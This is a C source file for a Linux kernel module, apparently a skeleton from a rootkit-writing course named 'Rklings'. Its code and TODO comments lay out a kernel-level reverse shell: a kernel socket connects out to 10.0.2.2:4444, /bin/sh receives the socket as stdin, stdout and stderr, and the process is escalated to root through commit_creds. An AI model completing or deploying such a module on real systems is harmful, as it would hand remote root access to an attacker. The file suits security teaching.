// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/sched/task.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static struct file *rk_sock_file;
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;

// Install the socket as stdin, stdout, stderr and escalate to root
static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	// TODO: Escalate to root with commit_creds(prepare_kernel_cred(&init_task)).

	// TODO: Loop i from 0 to 2:
	//   fd = get_unused_fd_flags(0);
	//   fd_install(fd, get_file(rk_sock_file));
	// This gives the shell stdin, stdout, stderr on the socket.
	// pr_info("rklings: install fds here\n");

	return 0;
}

static int __init rk_init(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	// TODO: Lock rk_shell_lock. If rk_shell_busy, unlock and return -EBUSY.
	// Set rk_shell_busy = true, then unlock.

	// TODO: Create a kernel TCP socket with sock_create_kern (same as L14).
	// On error, go to out_clear.

	// TODO: Fill addr and kernel_connect (same as L14).
	// On error, go to out_sock.

	// TODO: Convert socket to file: rk_sock_file = sock_alloc_file(sock, 0, NULL).
	// Check IS_ERR. On error, go to out_sock.

	// TODO: Set up usermodehelper with rk_umh_init callback.
	// On NULL, error = -ENOMEM, go to out_file.

	// TODO: call_usermodehelper_exec(info, UMH_WAIT_EXEC).

	return 0;

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_sock_file)
		fput(rk_sock_file);

	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
